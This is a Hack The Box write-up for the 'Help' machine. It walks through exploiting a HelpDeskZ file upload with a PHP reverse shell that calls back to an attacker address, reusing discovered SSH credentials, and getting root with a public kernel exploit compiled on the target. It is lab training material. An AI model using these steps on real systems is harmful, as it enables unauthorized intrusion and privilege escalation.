# HTB Help

## Overview

* OS: Ubuntu 16.04.5 LTS
* Kernel: 4.4.0-116-generic

---

## Enumeration

Add the target to `/etc/hosts`:

```bash
echo '10.129.230.159 help.htb' | sudo tee -a /etc/hosts
```

Initial web enumeration:

```bash
http://help.htb
```

The site reveals a **HelpDeskZ** support system.

Navigate to:

```bash
http://help.htb/support/
```

This confirms the application is running **HelpDeskZ**, which is known to be vulnerable to file upload issues in older versions.

---

## Initial Foothold (File Upload + Reverse Shell)

### Step 1: Prepare reverse shell

Edit a PHP reverse shell (e.g. pentestmonkey):

```bash
nano php-reverse-shell.php
```

Set:

```php
$ip = 'attacker_ip';
$port = 4444;
```

---

### Step 2: Start listener

```bash
nc -lvnp 4444
```

---

### Step 3: Exploit file upload

HelpDeskZ renames uploaded files, so use the exploit script:

```bash
searchsploit -m 40300
python2 40300.py http://help.htb/support/uploads/tickets/php-reverse-shell.php
```

---

### Step 4: Upload shell

Go to:

```bash
http://help.htb/support/?v=submit_ticket
```

* Submit a ticket
* Attach `php-reverse-shell.php`

The script will brute-force the uploaded filename and trigger the shell.

---

### Step 5: Get shell

Catch the shell:

```bash
nc -lvnp 4444
```

Upgrade it:

```bash
python -c "import pty; pty.spawn('/bin/bash')"
```

---

## User Access

During enumeration, credentials are discovered:

```bash
help:Welcome1
```

Switch to SSH for a stable shell:

```bash
sshpass -p 'Welcome1' ssh -o StrictHostKeyChecking=no help@10.129.230.159
```

Retrieve user flag:

```bash
cat ~/user.txt
```

---

## Privilege Escalation

### Step 1: Identify kernel

```bash
uname -a
```

Output:

```bash
Linux help 4.4.0-116-generic ...
```

This kernel is vulnerable to a known local privilege escalation exploit.

---

### Step 2: Obtain exploit

On Kali:

```bash
searchsploit -m 44298
```

---

### Step 3: Transfer exploit

```bash
sshpass -p 'Welcome1' scp -o StrictHostKeyChecking=no 44298.c help@10.129.230.159:/tmp/44298.c
```

---

### Step 4: Compile on target

Compiling locally caused GLIBC mismatch issues, so compile directly on the target:

```bash
sshpass -p 'Welcome1' ssh -tt -o StrictHostKeyChecking=no help@10.129.230.159
```

Then:

```bash
gcc -O2 -o /tmp/exploit /tmp/44298.c
chmod +x /tmp/exploit
```

---

### Step 5: Execute exploit

```bash
/tmp/exploit
```

Expected output:

```bash
task_struct = ...
uidptr = ...
spawning root shell
```

---

### Step 6: Root flag

```bash
id
cat /root/root.txt
```

---

## Key Notes

* Compiling exploits on Kali caused GLIBC version errors
* Static builds failed due to missing headers or runtime issues
* The reliable method was compiling directly on the target
* Kernel exploits are highly dependent on environment compatibility

---
